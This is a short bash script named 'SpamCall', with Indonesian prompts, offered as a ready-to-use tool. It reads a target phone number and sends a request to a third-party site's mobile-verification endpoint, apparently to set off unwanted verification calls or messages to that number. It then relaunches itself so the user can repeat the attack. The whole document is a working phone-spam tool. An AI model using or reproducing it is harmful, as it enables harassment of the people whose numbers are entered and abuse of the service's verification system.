clear
figlet SpamCall | lolcat
echo "<=======================================>" | lolcat
echo "[•] Author : Adam official" | lolcat
echo "[•] Github : https://github.com/adam894" | lolcat
echo "<=======================================>" | lolcat
date | lolcat
echo
echo "Cara : masukkan nomor dengan awalan 8xxxxxx"
read -p "[•] Number: " nomor
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
read -p "Lagi? (y/n) => " pilih
if [ $pilih == "y" ]
then
    bash SpamCall.sh
elif [ $pilih == "n" ]
then
    echo "terimakasih telah menggunakan tools ini!!!"
fi

